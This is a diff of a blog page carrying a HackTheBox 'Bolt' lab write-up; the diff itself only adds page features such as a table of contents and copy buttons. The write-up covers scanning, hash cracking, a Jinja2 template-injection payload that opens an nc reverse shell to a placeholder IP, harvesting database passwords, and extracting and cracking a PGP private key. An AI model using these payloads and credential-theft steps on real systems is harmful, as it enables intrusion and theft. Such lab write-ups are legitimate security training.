@@ -116,17 +116,40 @@
     <div class="search-dropdown mobile">
         <div id="search-dropdown-mobile"></div>
     </div><main class="main">
-                <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bolt Hackthebox writeup</h1><div class="post-meta">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bolt Hackthebox writeup</h1><div class="post-meta">
             <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/">Linux Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1294 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
-        </div><div class="content" id="content"><p>In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost &ldquo;demo&rdquo; which has some functions aren&rsquo;t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .</p>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning-">Scanning :</a></li>
+    <li><a href="#enumeration-">Enumeration :</a></li>
+    <li><a href="#enumeration-harder">Enumeration Harder</a></li>
+    <li><a href="#exploitation-">exploitation :</a></li>
+    <li><a href="#foothold-">Foothold :</a></li>
+    <li><a href="#eddie-user-">Eddie user :</a>
+      <ul>
+        <li><a href="#decrypting-the-message">Decrypting the message</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-access">Root Access</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost &ldquo;demo&rdquo; which has some functions aren&rsquo;t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .</p>
 <h2 id="scanning-">Scanning :</h2>
 <div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -A -T <span class="m">4</span> <span class="nv">$IP</span>  -sV -oN nmap/intial
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
@@ -162,7 +185,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb -H <span class="s2">&#34;Host: FUZZ.bolt.htb&#34;</span> -fw  <span class="m">10870</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">mail                    <span class="o">[</span>Status: 200, Size: 4943, Words: 345, Lines: 99<span class="o">]</span>
@@ -223,7 +246,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> file in <span class="k">$(</span> ls -d */<span class="k">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">do</span>
@@ -259,7 +282,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># under img dir</span>
 </span></span><span class="line"><span class="cl">find . -name db.sqlite3
 </span></span><span class="line"><span class="cl">./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3</span></span></code></pre></div></div>
@@ -278,14 +301,14 @@
     <div class="code-header language-">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><pre tabindex="0"><code>admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.</code></pre></div>
 <p>we can try to crack this hash with JTR :</p>
 <div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash
 </span></span><span class="line"><span class="cl"><span class="c1"># password:deadbolt</span></span></span></code></pre></div></div>
 <p>great we have credentials we can try to login at the web application with it and we are in:</p>
@@ -423,7 +446,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span></span></span></code></pre></div></div>
 <p>response :</p>
 <p><img
@@ -439,7 +462,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span class="o">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ip&gt; 9999 &gt;/tmp/f&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span></span></span></code></pre></div></div>
 <h2 id="foothold-">Foothold :</h2>
 <p>and we have our shell as www-data :</p>
@@ -476,7 +499,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep --color<span class="o">=</span>auto -rnw <span class="s1">&#39;.&#39;</span> -Rie <span class="s2">&#34;password&#34;</span> --color<span class="o">=</span>always 2&gt;/dev/null
 </span></span><span class="line"><span class="cl"><span class="c1"># ./passbolt.php:42:            &#39;password&#39; =&gt; &#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;,</span></span></span></code></pre></div></div>
 <p><img
@@ -492,13 +515,13 @@
     <div class="code-header language-">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><pre tabindex="0"><code>passbolt:rT2;jW7&lt;eY8!dX8}pQ8%</code></pre></div>
 <div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p
 </span></span><span class="line"><span class="cl"><span class="c1"># mysql&gt;</span></span></span></code></pre></div></div>
 <ul>
@@ -508,7 +531,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql &gt; SHOW databases <span class="p">;</span> <span class="c1"># list them</span>
 </span></span><span class="line"><span class="cl">mysql &gt; use passboltdb<span class="p">;</span>
 </span></span><span class="line"><span class="cl">mysql &gt; show tables<span class="p">;</span> <span class="c1"># list tables</span>
@@ -574,7 +597,7 @@
     <div class="code-header language-">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><pre tabindex="0"><code>Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it</code></pre></div>
 <ul>
 <li>so we should search for this browser to see what is this mail about</li>
@@ -596,14 +619,14 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eddie@bolt:~/.config/google-chrome$ grep <span class="s2">&#34;PRIVATE KEY&#34;</span> -r .</span></span></code></pre></div></div>
 <p>will find some results just have the header and not the key itself , but will find :</p>
 <div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
     <div class="code-header language-">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><pre tabindex="0"><code>Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches</code></pre></div>
 <p>seems promising , now to grep in a binary you should use &ldquo;-a&rdquo; which means all even binaries .</p>
 <p><img
@@ -629,7 +652,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gpg --import eddie_private
 </span></span><span class="line"><span class="cl">$ gpg -d message.inc</span></span></code></pre></div></div>
 <p>but it asks for a passphrase to import the gpg key</p>
@@ -648,7 +671,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gpg2john eddie_private &gt; eddie_key_hash
 </span></span><span class="line"><span class="cl">$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt eddie_key_hash</span></span></code></pre></div></div>
 <p><img
@@ -714,5 +737,5 @@
         <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
 </html>
